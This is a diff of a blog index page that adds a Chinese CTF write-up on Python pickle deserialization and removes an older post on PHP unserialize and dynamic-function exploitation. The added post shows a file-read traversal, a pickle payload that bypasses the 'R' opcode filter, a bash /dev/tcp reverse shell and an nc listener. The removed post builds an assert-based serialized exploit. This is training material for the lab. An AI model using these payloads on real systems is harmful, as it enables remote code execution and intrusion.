@@ -169,6 +169,85 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-python反序列化以及反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/19/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BC%B9shell/" class="article-date">
+  	<time datetime="2021-09-18T16:00:00.000Z" itemprop="datePublished">2021-09-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/19/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BC%B9shell/">
+        python反序列化以及反弹shell
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="python反序列化以及反弹shell（长城杯ez-python）"><a href="#python反序列化以及反弹shell（长城杯ez-python）" class="headerlink" title="python反序列化以及反弹shell（长城杯ez_python）"></a>python反序列化以及反弹shell（长城杯ez_python）</h1><p>首先我们打开页面，发现一张图片，然后构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pic=/app/app.py</span><br></pre></td></tr></table></figure>
+<p>读取源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line">from flask import render_template,redirect,send_from_directory</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">from flask import send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">class User():</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">def check(s):</span><br><span class="line">    if b&#x27;R&#x27; in s:</span><br><span class="line">        return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    try:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        if check(user):</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            username = user[&quot;username&quot;]</span><br><span class="line">        else:</span><br><span class="line">            username = &quot;bad,bad,hacker&quot;</span><br><span class="line">    except:</span><br><span class="line">        username = &quot;CTFer&quot;</span><br><span class="line">    pic = &#x27;&#123;0&#125;.jpg&#x27;.format(random.randint(1,7))</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        pic=request.args.get(&#x27;pic&#x27;)</span><br><span class="line">        with open(pic, &#x27;rb&#x27;) as f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line">    except:</span><br><span class="line">        pic=&#x27;&#123;0&#125;.jpg&#x27;.format(random.randint(1,7))</span><br><span class="line">        with open(pic, &#x27;rb&#x27;) as f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line"></span><br><span class="line">    return render_template(&#x27;index.html&#x27;, uname=username, pic=p )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;,port=8888)</span><br></pre></td></tr></table></figure>
+
+<p>在源码中看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        if check(user):</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            username = user[&quot;username&quot;]</span><br><span class="line"></span><br><span class="line">return render_template(&#x27;index.html&#x27;, uname=username, pic=p )</span><br></pre></td></tr></table></figure>
+<p>可知我们可以使用user这个利用点，来进行python反序列化，从而执行我们输入的命令，但是我们不知道flag在哪个文件中，所以我们可以使用反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>所以我们可以写一个exp对反弹shell的命令进行python序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">a = b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">a = pickletools.optimize(a)</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></table></figure>
+
+<p>其中ip是写公网ip，port端口自己定义，公网ip可以自己租一个服务器来接受反弹的shell</p>
+<p>然后抓包，并在cookie中加入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=上面脚本生成的base64编码的数</span><br></pre></td></tr></table></figure>
+<p>然后在服务器中的命令行中输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 端口</span><br></pre></td></tr></table></figure>
+<p>来监测我们反弹shell的端口，然后放包，我们可以获得shell，执行ls命令，发现flag在flagggggggggggggaaa文件中，所以我们再执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flagggggggggggggaaa</span><br></pre></td></tr></table></figure>
+<p>即可获得flag</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/119571814">https://blog.csdn.net/HBohan/article/details/119571814</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-phar反序列化以及pop链的构造" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1105,98 +1184,6 @@ $phar->setStub("<?php __HALT_COMPILER(); ?><p>“); //设置stub</p>
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-php动态函数及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/09/php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
-  	<time datetime="2021-09-08T16:00:00.000Z" itemprop="datePublished">2021-09-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/09/php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        php动态函数及反序列化
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="php动态函数及反序列化"><a href="#php动态函数及反序列化" class="headerlink" title="php动态函数及反序列化"></a>php动态函数及反序列化</h1><p>打开页面源码，发现有一个可疑的php文件，然后打开，发现源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="php动态函数"><a href="#php动态函数" class="headerlink" title="php动态函数"></a>php动态函数</h2><p>格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=system&amp;$b=ls;$a($b);</span><br></pre></td></tr></table></figure>
-<p>而这里也是用了php动态函数的原理，然后我是想构造一个eval()函数的，发现不行，报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Call to undefined function eval() in</span><br></pre></td></tr></table></figure>
-<p>而查了官方文档后可知：eval属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用它，而这种语法构造的还有：echo、print、unset()、isset()、empty()、include、require等</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">而system函数又被禁止了，所以我们可以使用assert()函数</span><br><span class="line"></span><br><span class="line">assert()</span><br></pre></td></tr></table></figure>
-<p>作用：检查一个断言是否为false</p>
-<p>注意：在php版本5到php版本7，assert()函数会将字符串当作是php代码执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以我们可以构造exp</span><br></pre></td></tr></table></figure>
-<?php
-#error_reporting(0);
-class HelloPhp
-{
-    public $a;
-    public $b;
-    public function __construct(){
-        $this->a = "phpinfo()";
-        $this->b = "assert";
-    }
-    public function __destruct(){
-        $a = $this->a;
-        $b = $this->b;
-    }
-}
-$c = new HelloPhp();
-echo serialize($c);
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后get提交就好</span><br><span class="line"></span><br><span class="line">魔术方法</span><br></pre></td></tr></table></figure>
-__contruct()--------------------在类的对象实例化时被调用
-
-__destruct()--------------------在类的对象被销毁之前被调用
-```
-在题目中是在die(0)在退出脚本时调用了__destruct()魔术方法
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
